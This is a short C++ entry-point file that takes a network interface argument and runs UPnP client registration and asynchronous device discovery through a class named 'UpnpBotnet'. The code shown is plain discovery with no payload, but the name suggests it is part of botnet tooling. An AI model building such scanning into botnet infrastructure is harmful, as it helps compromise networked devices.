#include "upnp.hpp"
#include <set>
#include <mutex>
#include <condition_variable>
#include <string>
#include <thread>

#include <libupnpp/control/description.hxx>
#include <npupnp/upnp.h>
#include <npupnp/upnpdebug.h>
#include <npupnp/upnptools.h>

#include <iostream>

//static int clctxt;
//
//static struct Upnp_Discovery devdetails;

int main(int argc, char **argv)
{
    if (argc != 2) {
        std::cerr << "Usage: ./upnp INTERFACE\n";
        return 1;
    }
    UpnpBotnet Upnp(argv[1]);
    Upnp.RegisterClient();
    Upnp.SearchAsync();
    Upnp.Loop();

    return 0;
}
